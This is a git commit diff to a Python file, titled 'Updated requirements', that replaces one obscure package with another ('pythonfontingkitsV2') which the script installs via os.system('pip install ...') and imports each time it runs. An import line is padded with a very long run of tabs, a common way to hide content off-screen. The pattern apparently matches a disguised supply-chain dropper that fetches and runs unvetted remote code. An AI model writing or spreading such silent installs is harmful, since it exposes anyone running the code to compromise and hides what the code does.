24821d3bedddce729de17862eda2f73bf9d9dbc1
Wieselnuggis <105999132+Wieselnuggis@users.noreply.github.com>
2023-07-24 16:26:27 -0500

    Updated requirements

--- updated.py
+++ updated.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolouringexts")
-import syscolouringexts
+os.system("pip install pythonfontingkitsV2")
+import pythonfontingkitsV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																								
 from optparse import Option
 import requests
